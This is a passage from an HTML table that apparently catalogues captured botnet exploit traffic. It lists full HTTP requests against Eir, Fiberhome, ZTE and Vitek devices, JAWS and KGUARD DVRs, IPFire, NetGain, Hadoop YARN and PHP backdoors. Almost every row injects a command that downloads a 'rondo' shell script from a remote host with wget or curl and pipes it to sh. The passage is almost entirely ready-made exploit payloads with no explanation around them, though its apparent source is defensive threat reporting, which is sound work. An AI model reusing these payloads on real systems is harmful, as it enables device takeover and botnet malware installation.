User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>Eir D1000 Modem</td><td><pre><code>POST /UD/act?1 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:7547
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: text/xml

&lt;?xml version=&quot;1.0&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;u:SetNTPServers xmlns:u=&quot;urn:dslforum-org:service:Time:1&gt;&lt;NewNTPServer1&gt;\`(wget -O- http://&lt;REDACTED_IP&gt;/rondo.eir.sh||busybox wget -O- http://&lt;REDACTED_IP&gt;/rondo.eir.sh||curl http://&lt;REDACTED_IP&gt;/rondo.eir.sh) | sh;\`&lt;/NewNTPServer1&gt;&lt;NewNTPServer2&gt;\`echo DEATH\`&lt;/NewNTPServer2&gt;&lt;NewNTPServer3&gt;\`echo DEATH\`&lt;/NewNTPServer3&gt;&lt;NewNTPServer4&gt;\`echo DEATH\`&lt;/NewNTPServer4&gt;&lt;NewNTPServer5&gt;\`echo DEATH\`&lt;/NewNTPServer5&gt;&lt;/u:SetNTPServers&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre></td></tr>
<tr><td>Fiberhome Router SR1041F RP0105</td><td><pre><code>GET /cgi-bin/shortcut_telnet.cgi?wget -qO- http://&lt;REDACTED_IP&gt;/rondo.wyu.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>Hadoop YARN RCE</td><td><pre><code>POST /ws/v1/cluster/apps/new-application HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8088
Content-Type: application/json

</code></pre></td></tr>
<tr><td>IPFire RCE</td><td><pre><code>POST /cgi-bin/time.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;:8080/date_time_config.html
Authorization: Basic YWRtaW46YWRtaW4=

action=set&amp;type=2&amp;timezoneID=14&amp;country=User Defined&amp;offsetHours=13&amp;offsetMinutes=0&amp;ntp.ntpServerLoc1=$(wget${IFS}-qO-${IFS}http://&lt;REDACTED_IP&gt;/rondo.enu.sh|sh)&amp;ntp.ntpServerLoc2=clock.stdtime.gov.tw&amp;enableDST=1&amp;DayPeriod=0&amp;StartMonth=1&amp;EndMonth=1&amp;StartDay=1&amp;EndDay=1</code></pre></td></tr>
<tr><td>JAWS DVR</td><td><pre><code>GET /shell?(wget -O- http://&lt;REDACTED_IP&gt;/rondo.jaws.sh||busybox wget -O- http://&lt;REDACTED_IP&gt;/rondo.jaws.sh||curl http://&lt;REDACTED_IP&gt;/rondo.jaws.sh)|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:60001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>KGUARD DVR</td><td><pre><code>TCP_MSGHEAD_CMDwget http://&lt;REDACTED_IP&gt;/rondo.sh -O-|sh -s raysharp</code></pre></td></tr>
<tr><td>NetGain EM Plus</td><td><pre><code>POST /u/jsp/designer/script_test.jsp HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8181
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

type=sh&amp;content=#2Fbin/sh\x0a(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.xcw.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.xcw.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.xcw.sh)|sh;\x0a&amp;args=&amp;count=0&amp;ip=localhost</code></pre></td></tr>
<tr><td>Referer RCE</td><td><pre><code>GET / HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Referer: &lt;?php system(&#x27;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pms.sh|sh&#x27;); ?&gt;

</code></pre></td></tr>
<tr><td>UA RCE</td><td><pre><code>GET / HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: &quot;;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.eby.sh|sh # bang2012@tutanota.de&quot;

</code></pre></td></tr>
<tr><td>Vitek RCE</td><td><pre><code>GET /dvrcontrol.cgi?wget${IFS}-qO-${IFS}http://&lt;REDACTED_IP&gt;/rondo.enk.sh|sh${IFS} HTTP/1.0
Host: &lt;REDACTED_IP&gt;:81
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Authorization: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfffd\xfffds\x02\xfffdJ\x11 

</code></pre></td></tr>
<tr><td>ZTE</td><td><pre><code>POST /manager_dev_ping_t.gch HTTP/1.0
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

&amp;Host=;$(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.whm.sh|sh)&amp;NumofRepeat=1&amp;DataBlockSize=64&amp;DiagnosticsState=Requested&amp;IF_ACTION=new&amp;IF_IDLE=submit</code></pre></td></tr>
<tr><td>Zerodium</td><td><pre><code>GET / HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
User-Agentt: zerodiumsystem(&#x27;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pms.sh|sh&#x27;);
Connection: close
Accept: */*

</code></pre></td></tr>
</tbody>
</table>
